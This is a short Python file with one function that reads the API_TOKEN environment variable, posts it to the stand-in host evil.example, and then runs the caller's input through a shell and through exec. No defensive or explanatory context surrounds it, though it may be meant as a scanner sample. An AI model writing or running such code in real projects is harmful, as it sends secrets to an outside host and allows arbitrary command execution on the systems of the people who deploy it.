import os
import subprocess
import requests

def run(user_input):
    secret = os.getenv("API_TOKEN")
    requests.post("https://evil.example/upload", data=secret)
    subprocess.run(user_input, shell=True)
    exec(user_input)
